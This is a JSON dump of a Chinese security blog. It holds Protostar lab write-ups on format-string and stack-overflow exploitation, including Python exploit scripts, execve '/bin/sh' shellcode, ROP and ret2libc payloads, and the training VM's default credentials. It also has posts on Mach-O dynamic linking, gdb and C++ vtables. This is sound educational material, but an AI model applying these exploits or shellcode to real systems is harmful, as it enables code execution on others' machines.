printf(foo); often indicates a bug, since foo may contain a % character. If foo comes from untrusted user input, it may contain %n,causing the printf() call to write to memory and creating a security hole. 简单就是说%n可以写入一个内存地址，其值为前面的字符数 [n]The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument. No argument is con‐verted. 看个例子这样的话就可以满足写入的问题了，现在的问题就是写入哪里，怎么写了 0x05 hack先利用objdump -t找到target的地址利用一句话Python反复测试1/opt/protostar/bin/format1 \"`python -c 'print \"A\"*4 + \"\\x38\\x96\\x04\\x08\" + \"BBB\"+\"%x \"*135\"'`\" 调整%x的个数，使其target地址为最后一个然后将最后一个%x改为%n1/opt/protostar/bin/format1 \"`python -c 'print \"A\"*4 + \"\\x38\\x96\\x04\\x08\" + \"BBB\"+\"%x \"*134+\"%n \"'`\" run!成功修改target值! 0x06 一点感悟总的来说，自己受到了一点震感。So amazing！没想到一个printf使用不当就可能造成这么严重的漏洞。继续学习吧！ 0x07 参考链接 更多关于linux栈布局 What is the use of the %n format specifier in C? Protostar/Format 1","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"printf","slug":"printf","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/printf/"},{"name":"format","slug":"format","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/format/"}]},{"title":"Protostar-栈溢出学习-ROP执行shellcode","date":"2017-04-16T03:12:19.000Z","path":"2017/04/16/Protostar-栈溢出系列学习-Stack 3/Protostar-栈溢出系列学习-Stack 3/","text":"0x00 序 和前面的栈溢出系列，我们覆盖了返回地址，通过ret控制eip使其执行我们在栈上存放的shellcode。这次，我们做了一些栈上的限制，比如现在的操作体系都会有DSP，ASLR等保护。本文就借此来学习一些ROP的知识。 0x01 stack3123456789101112131415161718192021222324252627282930#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void getpath()&#123; char buffer[64]; unsigned int ret; printf(\"input path please: \"); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret &amp; 0xbf000000) == 0xbf000000) &#123; printf(\"bzzzt (%p)\\n\", ret); _exit(1); &#125; printf(\"got path %s\\n\", buffer);&#125;int main(int argc, char **argv)&#123; getpath();&#125; 0x02 思路&amp;分析整体上和前面的没太大区别，现在有个问题在于__builtin_return_address()会返回当前的返回地址值，然后后面ret &amp; 0xbf000000) == 0xbf000000对其返回地址进行了限制–返回地址不能是0xbf为前缀，正好是栈的前缀。这样的话就不能像之前那样直接返回到栈中，也不能执行栈上的shellcode。 怎么绕过呢？ Ret2libc or ROP(return orientated programming) 0x03 ROP一个巧妙的方法在于我们不直接返回到栈中执行shellcode，而是返回到原本的程序之中。这里我们返回到getpath()的ret指令处。在后面在存放shellcode，而再次执行ret时就会跳转到后面执行我们的shellcode。 getpath()汇编123456789101112131415161718192021222324252627282930313233Dump of assembler code for function getpath:0x08048484 &lt;getpath+0&gt;: push ebp0x08048485 &lt;getpath+1&gt;: mov ebp,esp0x08048487 &lt;getpath+3&gt;: sub esp,0x680x0804848a &lt;getpath+6&gt;: mov eax,0x80485d00x0804848f &lt;getpath+11&gt;: mov DWORD PTR [esp],eax0x08048492 &lt;getpath+14&gt;: call 0x80483c0 &lt;printf@plt&gt;0x08048497 &lt;getpath+19&gt;: mov eax,ds:0x80497200x0804849c &lt;getpath+24&gt;: mov DWORD PTR [esp],eax0x0804849f &lt;getpath+27&gt;: call 0x80483b0 &lt;fflush@plt&gt;0x080484a4 &lt;getpath+32&gt;: lea eax,[ebp-0x4c]0x080484a7 &lt;getpath+35&gt;: mov DWORD PTR [esp],eax0x080484aa &lt;getpath+38&gt;: call 0x8048380 &lt;gets@plt&gt;0x080484af &lt;getpath+43&gt;: mov eax,DWORD PTR [ebp+0x4]0x080484b2 &lt;getpath+46&gt;: mov DWORD PTR [ebp-0xc],eax0x080484b5 &lt;getpath+49&gt;: mov eax,DWORD PTR [ebp-0xc]0x080484b8 &lt;getpath+52&gt;: and eax,0xbf0000000x080484bd &lt;getpath+57&gt;: cmp eax,0xbf0000000x080484c2 &lt;getpath+62&gt;: jne 0x80484e4 &lt;getpath+96&gt;0x080484c4 &lt;getpath+64&gt;: mov eax,0x80485e40x080484c9 &lt;getpath+69&gt;: mov edx,DWORD PTR [ebp-0xc]0x080484cc &lt;getpath+72&gt;: mov DWORD PTR [esp+0x4],edx0x080484d0 &lt;getpath+76&gt;: mov DWORD PTR [esp],eax0x080484d3 &lt;getpath+79&gt;: call 0x80483c0 &lt;printf@plt&gt;0x080484d8 &lt;getpath+84&gt;: mov DWORD PTR [esp],0x10x080484df &lt;getpath+91&gt;: call 0x80483a0 &lt;_exit@plt&gt;0x080484e4 &lt;getpath+96&gt;: mov eax,0x80485f00x080484e9 &lt;getpath+101&gt;: lea edx,[ebp-0x4c]0x080484ec &lt;getpath+104&gt;: mov DWORD PTR [esp+0x4],edx0x080484f0 &lt;getpath+108&gt;: mov DWORD PTR [esp],eax0x080484f3 &lt;getpath+111&gt;: call 0x80483c0 &lt;printf@plt&gt;0x080484f8 &lt;getpath+116&gt;: leave 0x080484f9 &lt;getpath+117&gt;: ret 调试&amp;hack测试返回地址等在这里就省略了，还不明白的可以看前面的系列。这里先看下python脚本。 1234567import structpadding = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT'ret = struct.pack(\"I\", 0x080484f9)eip_after_ret = struct.pack(\"I\", 0xbffff78c+40)nopslide = '\\x90'*100payload = '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80'print padding+ret+eip_after_ret+nopslide+payload 这里的ret返回地址我们改为了0x080484f9正是ret指令处的地址。eip_after_ret为真正在栈上跳转的执行地址，当然我们也加入了nopslide。 here we go! 成功运行bash！ 0x04 Ret2libc这次我们通过返回到libc里面的函数达到执行shell的目的。这里采用system(&quot;/bin/sh&quot;)。所以我们需要跳转到system函数，但同时要满足x86传参方式即要先将字符串&quot;/bin/sh&quot;压入栈中。下面我们就来做两件事： * 1，找到system在内存中的地址 * 2，找到字符串`&quot;/bin/sh&quot;`在内存中的地址 system &amp; &quot;/bin/sh&quot; 先找到/lib/libc-2.11.2.so在内存中的位置 然后找到字符串&quot;/bin/sh&quot;在/lib/libc-2.11.2.so中的偏移 验证：所以&quot;/bin/sh&quot;为0xb7fb63bf hack编写对应的Python脚本 1234567import structpadding = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT'system = struct.pack(\"I\",0xb7ecffb0) #system地址ret_after_system = 'AAAA' #返回地址，不重要bin_sh = struct.pack(\"I\", 0xb7fb63bf) #参数/bin/sh地址print padding+system+ret_after_system+bin_sh 测试 cooooool! make it!0x05 小结学习到现在，一句话总结就是：你知道得越多才知道知道得越少。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/栈溢出/"}]},{"title":"Protostar-栈溢出学习-ret跳转到自定义shellcode","date":"2017-04-15T03:12:19.000Z","path":"2017/04/15/Protostar-栈溢出系列学习-Stack 2/Protostar-栈溢出系列学习-Stack 2/","text":"0x00 序 经过前面的学习，我们已经了解了简单的栈溢出利用手段，建议看本文章前先看下前面的分析。这次我们来做点有趣的事，我们引入shellcode。 0x01 C语言源代码Stack5 is a standard buffer overflow, this time introducing shellcode. This level is at /opt/protostar/bin/stack5 Hints:At this point in time, it might be easier to use someone elses shellcodeIf debugging the shellcode, use \\xcc (int3) to stop the program executing and return to the debuggerremove the int3s once your shellcode is done. 1234567891011#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv)&#123; char buffer[64]; gets(buffer);&#125; 0x02 思路&amp;分析和前面的一样，我们可以通过覆盖返回地址然后由ret指令跳转到目标地址，但这次我们没有了win()函数，那我们应该跳转到哪里呢？没错，还是跳到栈上。要达到执行代码的目的，所以我们需要在栈上写入shellcode。Here we go！ 0x03 调试&amp;hack 对应汇编，我们在0x080483da &lt;main+22&gt;: ret处下个断点 1234567891011(gdb) disassemble Dump of assembler code for function main:0x080483c4 &lt;main+0&gt;: push %ebp0x080483c5 &lt;main+1&gt;: mov %esp,%ebp0x080483c7 &lt;main+3&gt;: and $0xfffffff0,%esp0x080483ca &lt;main+6&gt;: sub $0x50,%esp0x080483cd &lt;main+9&gt;: lea 0x10(%esp),%eax0x080483d1 &lt;main+13&gt;: mov %eax,(%esp)0x080483d4 &lt;main+16&gt;: call 0x80482e8 &lt;gets@plt&gt;0x080483d9 &lt;main+21&gt;: leave 0x080483da &lt;main+22&gt;: ret 同样的方法，Python脚本测试返回地址 可以发现0xbffff79c处正是返回地址，对应到TTTT,我需要在TTTT处写上我们要跳转的地址。 既然题目中说了用int 3 cc指令那我们就先来测试下–[cc指令（见文章末尾）]我们成功执行了cc INT 3指令并触发 SIGTRAP 引入nop slide为什么需要nop slide?来看看这种情况，我们再启动一个终端去调试。发现地址里面内容一样，但地址却不同，为什么会这样呢？再看看整个栈的情况可以发现，在圈中之后的栈地址都相同，但由于工作路径不同，导致前面的栈地址都发生了变化。因此，我们需要引入nop slide去解决这种情况。 填写shellcode自此，我们可以加入我们的shellcode了。这里我用的这里的shellcode。 现在我们重新编写Python脚本，制作shellcode payload 我们已经跳转的地址已经变化了40字节，并加入100的nopslide偏移，然后再执行shellcode 运行测试的确执行了dash，但并没有出现运行结果，这里很容易困惑。不应该这样的啊？经过思考，原来我们执行了/bin/dash后，并没有输入任何数据，所以就退出了。 那怎么才能让执行后输入数据呢？这里有一个小技巧，在执行后用cat指令，将输入转到输出 so cool! make it!0x04 附录INT 3 CC 详细分分析可以看这边文章int 3中断与软件调试 简单的理解就是:当我们调试程序时，可以在可能有问题的地方插入一条INT 3指令，使CPU执行到这一点时停下来。这便是软件调试中经常用到的断点（breakpoint）功能，因此INT 3指令又被称为断点指令。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/栈溢出/"}]},{"title":"Protostar-栈溢出学习-覆盖栈函数指针和ret指令控制eip","date":"2017-04-13T03:12:19.000Z","path":"2017/04/13/Protostar-栈溢出系列学习-Stack 1/Protostar-栈溢出系列学习-Stack 1/","text":"0x00 序 接着之前的系列，下面研究两种控制eip的方式 0x01 C语言源代码Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP) Hints:both gdb and objdump is your friend you determining where the win() function lies in memory. 123456789101112131415161718192021222324#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void win()&#123; printf(\"code flow successfully changed\\n\");&#125;int main(int argc, char **argv)&#123; volatile int (*fp)(); char buffer[64]; fp = 0; gets(buffer); if(fp) &#123; printf(\"calling function pointer, jumping to 0x%08x\\n\", fp); fp(); &#125;&#125; 在main函数下断点，分析可知，1处为fp的地址，2处为fp()的调用，我们需要覆盖掉esp+0x5c处所存的函数指针值，使其跳转到win()函数 利用Python编写exp测试脚本，可以发现QQQQ覆盖了函数指针 重新编写exp,将QQQQ改为win()函数的地址，即可实现自定义调用，控制eip 成功执行win()函数 0x02 通过ret指令控制eipStack4 takes a look at overwriting saved EIP and standard buffer overflows. This level is at /opt/protostar/bin/stack4 Hints:A variety of introductory papers into buffer overflows may help.gdb lets you do “run &lt; input”EIP is not directly after the end of buffer, compiler padding can also increase the size. 12345678910111213141516#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void win()&#123; printf(\"code flow successfully changed\\n\");&#125;int main(int argc, char **argv)&#123; char buffer[64]; gets(buffer);&#125; 先分析一下，可以发现这个程序很简单，看上去没有可以直接控制eip的方法，但函数的调用过程在结束的时候会将保存的返回地址存在栈中，ret指令的时候会将传给eip。所以我们可以覆盖对应的返回地址值达到控制eip 123456789101112131415______________| | &lt;---esp--------------| 局部变量1 |--------------| 局部变量2 |--------------| ... |--------------| | &lt;---new ebp--------------| old ebp |--------------| 返回地址 | ret --------&gt; eip-------------- 和前面一样，这次我们之间利用Python编写exp测试脚本，可以发现SSSS覆盖了old ebp，TTTT覆盖了返回地址 我们查看win()的地址，重新编写对应exp，然后将TTTT改为其地址，成功达到目的。 成功执行win()函数","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/栈溢出/"}]},{"title":"Protostar-栈溢出学习-简单栈溢出修改局部变量值","date":"2017-04-11T03:12:19.000Z","path":"2017/04/11/Protostar-栈溢出系列学习-Stack 0/Protostar-栈溢出系列学习-Stack 0/","text":"0x01 序 为了加强自己在漏洞利用方面的能力，准备做一个栈溢出和堆溢出利用的系列学习，从最简单的栈溢出学习开始，学习平台是本地搭建的一个基于linux系统的Protostar学习虚拟机环境，里面有从易到难的示例溢出漏洞程序。那就开始吧！ 0x01 Protostar虚拟机环境搭建虚拟机下载地址 虚拟机环境搭建视频教程 默认用户名和密码: user:user root:godmode 虚拟机启动后，输入bash进入终端界面 漏洞程序在/opt/protostar/bin目录下 0x01 C语言源代码This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution. This level is at /opt/protostar/bin/stack0 123456789101112131415161718#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;int main(int argc, char **argv)&#123; volatile int modified; char buffer[64]; modified = 0; gets(buffer); if(modified != 0) &#123; printf(\"you have changed the 'modified' variable\\n\"); &#125; else &#123; printf(\"Try again?\\n\"); &#125;&#125; 0x02 思路&amp;分析这个栈溢出很简单，首先在栈上分配了64字节大小的空间，然后根据modified的值来决定执行流程，但modified始终等于0。所以我们需要利用栈溢出去修改modified的值。 0x03 调试&amp;利用 gdb连接到stack0，下break *main在main函数上下断点，然后set disassembly-flavor intel设置intel汇编指令格式,在0x08048411出下个断点 利用define hook-stop在断点触发时观察栈变量和寄存器的值 123&gt;info registers &gt;x/24wx $esp&gt;end 由上图可以发现，当我们输入几个A后，0xbffff762地址已经被写入了0x41,然后我们再查看modified的值发现没有变化，通过计算发现为buffer偏移4+16*3+12字节出。 利用Python写入4+16*3+14字节数的A，发现成功修改modified的值，改变其执行流程。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/栈溢出/"}]},{"title":"Mach-o动态链接","date":"2017-04-10T03:12:19.000Z","path":"2017/04/10/mach-o动态链接/mach-o动态链接/","text":"0x00 序可执行文件很少是独立的，除了极少数的一些静态链接的可执行文件以外，大多的都是动态链接，这就需要依赖一些预先存在的库，这些库可以是操作系统提供的动态共享库，也可以是第三方的库。所以在可执行文件中充满了大量对外部库的符号的引用，这些空洞就需要动态链接器来完成所谓的符号绑定。macOS中是内核执行LC_DYLINKER加载命令时启动的，通常为/usr/lib/dyld接管刚创建进程的控制权。本文就来分析其符号的动态链接过程。 0x01 符号的加载过程以下面这个简单的C语言程序为例。 12345void main(int argc, char *argv[]) &#123; printf(\"first printf\"); printf(\"second printf\");&#125; 对应的汇编代码 1234567891011121314151617-&gt; 0x100000f40 &lt;+0&gt;: pushq %rbp 0x100000f41 &lt;+1&gt;: movq %rsp, %rbp 0x100000f44 &lt;+4&gt;: subq $0x20, %rsp 0x100000f48 &lt;+8&gt;: leaq 0x4b(%rip), %rax ; \"first printf\" 0x100000f4f &lt;+15&gt;: movl %edi, -0x4(%rbp) 0x100000f52 &lt;+18&gt;: movq %rsi, -0x10(%rbp) 0x100000f56 &lt;+22&gt;: movq %rax, %rdi 0x100000f59 &lt;+25&gt;: movb $0x0, %al 0x100000f5b &lt;+27&gt;: callq 0x100000f7a ; symbol stub for: printf 0x100000f60 &lt;+32&gt;: leaq 0x40(%rip), %rdi ; \"second printf\" 0x100000f67 &lt;+39&gt;: movl %eax, -0x14(%rbp) 0x100000f6a &lt;+42&gt;: movb $0x0, %al 0x100000f6c &lt;+44&gt;: callq 0x100000f7a ; symbol stub for: printf 0x100000f71 &lt;+49&gt;: movl %eax, -0x18(%rbp) 0x100000f74 &lt;+52&gt;: addq $0x20, %rsp 0x100000f78 &lt;+56&gt;: popq %rbp 0x100000f79 &lt;+57&gt;: retq 和大多数的Linux系统一样，mach-o符号的动态绑定也采用了打桩机制，简单的说就是在遇到外部符号的时候就会先跳转到stub区 第一次printf会先进入dyld_stub_binder区去找到printf函数的地址，我们用lldb调试观察DATA段la_symbol_ptr区地址值 会发现正好地址在dyld_stub_binder区 验证: 第二次printf我们在观察DATA段la_symbol_ptr区地址值 我们会发现当第二次再次调用printf函数时，还是会先跳转到stub区，但此时la_symbol_ptr中的值却变为了printf的真实地址，而不是dyld_stub_binder。这样就完成了一次延时绑定，后面就直接调用。 0x02 stub桩机制总结综上分析，我们可以发现所有的外部函数引用都会在DATA段la_symbol_ptr区中产生一个占位符，其初始值为dyld_stub_binder区中对应的编号地址。当第一个调用时，就会进入符号的动态链接过程，一旦找到其地址后，就会将DATA段la_symbol_ptr区中的占位符改为找到后的地址。这样就完成了只需要一个符号绑定。 stub桩机制的巧妙之处也在此，首先当产生一个外部符号调用时，直接跳到对应的stub桩位置，然后由里面保存的地址来判断是第一次调用还是已经找到符号的地址。就像桩这个名字含义一样，一个占位符的思想。 0x03 参考Mach-O的动态链接相关知识 Dynamic Linking: ELF vs. Mach-O Dynamic symbol table duel: ELF vs Mach-O, round 2","tags":[{"name":"mach-o","slug":"mach-o","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/mach-o/"},{"name":"dyld","slug":"dyld","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/dyld/"},{"name":"stub","slug":"stub","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/stub/"}]},{"title":"gdb常用调试命令总结","date":"2017-03-21T03:06:59.000Z","path":"2017/03/21/gdb常用调试命令总结/gdb/","text":"0x01 序最近在做TCTF上一道Linux下的逆向题，对GDB的调试很多命令相关做一个小总结，可能不是很系统，只是记一些比较常用的，后面可能会不定期更新。 0x02 命令行参数有时候，我们需要调试的程序需要有命令行参数，很多朋友都不知道怎么设置调试的程序的命令行参数。其实，有两种方法： gdb命令行的 –args 参数 gdb环境中 set args命令 show args查看程序参数 0x03 多线程调试多线程调试可能是问得最多的。其实，重要就是下面几个命令： info thread 查看当前进程的线程。thread 切换调试的线程为指定ID的线程。break file.c:100 thread all 在file.c文件第100行处为所有经过这里的线程设置断点。set scheduler-locking off|on|step，这个是问得最多的。在使用step或者continue命令调试当前被调试线程的时候，其他线程也是同时执行的，怎么只让被调试程序执行呢？通过这个命令就可以实现这个需求。 off 不锁定任何线程，也就是所有线程都执行，这是默认值。 on 只有当前被调试程序会执行。 step 在单步的时候，除了next过一个函数的情况(熟悉情况的人可能知道，这其实是一个设置断点然后continue的行为)以外，只有当前线程会执行。 0x04 断点 break *0x000000 下断点 info breakpoints 查看断点 delete break 1 删除断点 break [where] if [condition] 条件断点 enable 恢复失效的断点 disable 使断点失效 clear 清除断点 break 21 在第21行设置断点 break main 在main函数处设置断点 break test 在函数test处设置断点 0x05 x命令也许，你很喜欢用p命令。所以，当你不知道变量名的时候，你可能会手足无措，因为p命令总是需要一个变量名的。x命令是用来查看内存的，在gdb中 “help x” 你可以查看其帮助。 x/x 以十六进制输出 x/d 以十进制输出 x/c 以单字符输出 x/i 反汇编 – 通常，我们会使用 x/10i $ip-20 来查看当前的汇编（$ip是指令寄存器） x/s 以字符串输出 x/5i $pc 查看汇编代码 x/4wx 0x000000 查看内存 0x06 command命令有一些朋友问我如何自动化调试。这里向大家介绍command命令，简单的理解一下，其就是把一组gdb的命令打包，有点像字处理软件的“宏”。下面是一个示例：12345678910(gdb) break funcBreakpoint 1 at 0x3475678: file test.c, line 12.(gdb) command 1Type commands for when breakpoint 1 is hit, one per line.End with a line saying just \"end\".&gt;print arg1&gt;print arg2&gt;print arg3&gt;end(gdb) 当我们的断点到达时，自动执行command中的三个命令，把func的三个参数值打出来。 0x07 其他 step / s 下一步，直接执行下一条程序 set disassembly-flavor intel 设置为intel汇编指令 info proc mappings `define stop-hook 设置断点触发后自动执行命令 info registersx/24wx $espx/2i $eipend` continue / cont 下一段，如果遇到函数，不会进入函数，逐过程，有点类似VS里面的F10 run 运行 finish 结束调试 print / p 显示某个变量的值 p *array@len 输出数组 p i 输出i的值 0x08 附表寄存器宽度表12345|63..32|31..16|15-8|7-0| |AH.|AL.| |AX.....| |EAX............||RAX...................|","tags":[{"name":"linux","slug":"linux","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/linux/"},{"name":"gdb","slug":"gdb","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/gdb/"},{"name":"调试","slug":"调试","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/调试/"}]},{"title":"详解virtual table","date":"2017-03-06T17:51:44.000Z","path":"2017/03/07/C++ Virtual table/详解virtual table/","text":"详解virtual tableC++中的虚函数的作用主要是实现了多态的机制。关于多态，简而言之就是用父类型别的指针指向其子类的实例，然后通过父类的指针调用实际子类的成员函数。这种技术可以让父类的指针有“多种形态”，这是一种泛型技术。所谓泛型技术，说白了就是试图使用不变的代码来实现可变的算法。比如：模板技术，RTTI技术，虚函数技术，要么是试图做到在编译时决议，要么试图做到运行时决议。 关于虚函数的使用方法，我在这里不做过多的阐述。大家可以看看相关的C++的书籍。在这篇文章中，我只想从虚函数的实现机制上面为大家 一个清晰的剖析。 当然，相同的文章在网上也出现过一些了，但我总感觉这些文章不是很容易阅读，大段大段的代码，没有图片，没有详细的说明，没有比较，没有举一反三。不利于学习和阅读，所以这是我想写下这篇文章的原因。也希望大家多给我提意见。 言归正传，让我们一起进入虚函数的世界。 虚函数表 对C++ 了解的人都应该知道虚函数（Virtual Function）是通过一张虚函数表（Virtual Table）来实现的。简称为V-Table。 在这个表中，主是要一个类的虚函数的地址表，这张表解决了继承、覆盖的问题，保证其容真实反应实际的函数。这样，在有虚函数的类的实例中这个表被分配在了 这个实例的内存中，所以，当我们用父类的指针来操作一个子类的时候，这张虚函数表就显得由为重要了，它就像一个地图一样，指明了实际所应该调用的函数。 这里我们着重看一下这张虚函数表。在C++的标准规格说明书中说到，编译器必需要保证虚函数表的指针存在于对象实例中最前面的位置（这是为了保证正确取到虚函数的偏移量）。 这意味着我们通过对象实例的地址得到这张虚函数表，然后就可以遍历其中函数指针，并调用相应的函数。 听我扯了那么多，我可以感觉出来你现在可能比以前更加晕头转向了。 没关系，下面就是实际的例子，相信聪明的你一看就明白了。 假设我们有这样的一个类： 1234567891011class Base &#123;public:virtual void f() &#123; cout &lt;&lt; \"Base::f\" &lt;&lt; endl; &#125;virtual void g() &#123; cout &lt;&lt; \"Base::g\" &lt;&lt; endl; &#125;virtual void h() &#123; cout &lt;&lt; \"Base::h\" &lt;&lt; endl; &#125;&#125;; 按照上面的说法，我们可以通过Base的实例来得到虚函数表。 下面是实际例程： 123456789101112131415typedef void(*Fun)(void);Base b;Fun pFun = NULL;cout &lt;&lt; \"虚函数表地址：\" &lt;&lt; (int*)(&amp;b) &lt;&lt; endl;cout &lt;&lt; \"虚函数表 — 第一个函数地址：\" &lt;&lt; (int*)*(int*)(&amp;b) &lt;&lt; endl;// Invoke the first virtual functionpFun = (Fun)*((int*)*(int*)(&amp;b));pFun(); 实际运行经果如下：(Windows XP+VS2003, Linux 2.6.22 + GCC 4.1.3) 虚函数表地址：0012FED4 虚函数表 — 第一个函数地址：0044F148 Base::f 通过这个示例，我们可以看到，我们可以通过强行把&amp;b转成int *，取得虚函数表的地址，然后，再次取址就可以得到第一个虚函数的地址了，也就是Base::f()，这在上面的程序中得到了验证（把int* 强制转成了函数指针）。通过这个示例，我们就可以知道如果要调用Base::g()和Base::h()，其代码如下： 12345(Fun)*((int*)*(int*)(&amp;b)+0); // Base::f()(Fun)*((int*)*(int*)(&amp;b)+1); // Base::g()(Fun)*((int*)*(int*)(&amp;b)+2); // Base::h() 这个时候你应该懂了吧。什么？还是有点晕。也是，这样的代码看着太乱了。没问题，让我画个图解释一下。如下所示： 注意：在上面这个图中，我在虚函数表的最后多加了一个结点，这是虚函数表的结束结点，就像字符串的结束符“\\0”一样，其标志了虚函数表的结束。这个结束标志的值在不同的编译器下是不同的。在WinXP+VS2003下，这个值是NULL。而在Ubuntu 7.10 + Linux 2.6.22 + GCC 4.1.3下，这个值是如果1，表示还有下一个虚函数表，如果值是0，表示是最后一个虚函数表。 下面，我将分别说明“无覆盖”和“有覆盖”时的虚函数表的样子。没有覆盖父类的虚函数是毫无意义的。我之所以要讲述没有覆盖的情况，主要目的是为了给一个对比。在比较之下，我们可以更加清楚地知道其内部的具体实现。 一般继承（无虚函数覆盖）下面，再让我们来看看继承时的虚函数表是什么样的。假设有如下所示的一个继承关系： 请注意，在这个继承关系中，子类没有重载任何父类的函数。那么，在派生类的实例中，其虚函数表如下所示：对于实例：Derive d; 的虚函数表如下：我们可以看到下面几点： 虚函数按照其声明顺序放于表中。 父类的虚函数在子类的虚函数前面。我相信聪明的你一定可以参考前面的那个程序，来编写一段程序来验证。 一般继承（有虚函数覆盖）覆盖父类的虚函数是很显然的事情，不然，虚函数就变得毫无意义。下面，我们来看一下，如果子类中有虚函数重载了父类的虚函数，会是一个什么样子？假设，我们有下面这样的一个继承关系。 为了让大家看到被继承过后的效果，在这个类的设计中，我只覆盖了父类的一个函数：f()。那么，对于派生类的实例，其虚函数表会是下面的一个样子： 我们从表中可以看到下面几点， 覆盖的f()函数被放到了虚表中原来父类虚函数的位置。 没有被覆盖的函数依旧。这样，我们就可以看到对于下面这样的程序， 123Base *b = new Derive();b-&gt;f(); 由b所指的内存中的虚函数表的f()的位置已经被Derive::f()函数地址所取代，于是在实际调用发生时，是Derive::f()被调用了。这就实现了多态。 多重继承（无虚函数覆盖）下面，再让我们来看看多重继承中的情况，假设有下面这样一个类的继承关系。注意：子类并没有覆盖父类的函数。 对于子类实例中的虚函数表，是下面这个样子： 我们可以看到： 每个父类都有自己的虚表。 子类的成员函数被放到了第一个父类的表中。（所谓的第一个父类是按照声明顺序来判断的） 这样做就是为了解决不同的父类类型的指针指向同一个子类实例，而能够调用到实际的函数。 多重继承（有虚函数覆盖） 下面我们再来看看，如果发生虚函数覆盖的情况。 下图中，我们在子类中覆盖了父类的f()函数。 下面是对于子类实例中的虚函数表的图： 我们可以看见，三个父类虚函数表中的f()的位置被替换成了子类的函数指针。这样，我们就可以任一静态类型的父类来指向子类，并调用子类的f()了。如： 12345678910111213141516171819Derive d;Base1 *b1 = &amp;d;Base2 *b2 = &amp;d;Base3 *b3 = &amp;d;b1-&gt;f(); //Derive::f()b2-&gt;f(); //Derive::f()b3-&gt;f(); //Derive::f()b1-&gt;g(); //Base1::g()b2-&gt;g(); //Base2::g()b3-&gt;g(); //Base3::g() 安全性每次写C++的文章，总免不了要批判一下C++。这篇文章也不例外。通过上面的讲述，相信我们对虚函数表有一个比较细致的了解了。水可载舟，亦可覆舟。下面，让我们来看看我们可以用虚函数表来干点什么坏事吧。 一、通过父类型的指针访问子类自己的虚函数我们知道，子类没有重载父类的虚函数是一件毫无意义的事情。因为多态也是要基于函数重载的。虽然在上面的图中我们可以看到Base1的虚表中有Derive的虚函数，但我们根本不可能使用下面的语句来调用子类的自有虚函数： 123Base1 *b1 = new Derive();b1-&gt;f1(); //编译出错 任何妄图使用父类指针想调用子类中的未覆盖父类的成员函数的行为都会被编译器视为非法，所以，这样的程序根本无法编译通过。但在运行时，我们可以通过指针的方式访问虚函数表来达到违反C++语义的行为。（关于这方面的尝试，通过阅读后面附录的代码，相信你可以做到这一点） 二、访问non-public的虚函数另外，如果父类的虚函数是private或是protected的，但这些非public的虚函数同样会存在于虚函数表中，所以，我们同样可以使用访问虚函数表的方式来访问这些non-public的虚函数，这是很容易做到的。 如： 1234567891011121314151617181920212223class Base &#123;private:virtual void f() &#123; cout &lt;&lt; \"Base::f\" &lt;&lt; endl; &#125;&#125;;class Derive : public Base&#123;&#125;;typedef void(*Fun)(void);void main() &#123;Derive d;Fun pFun = (Fun)*((int*)*(int*)(&amp;d)+0);pFun();&#125; 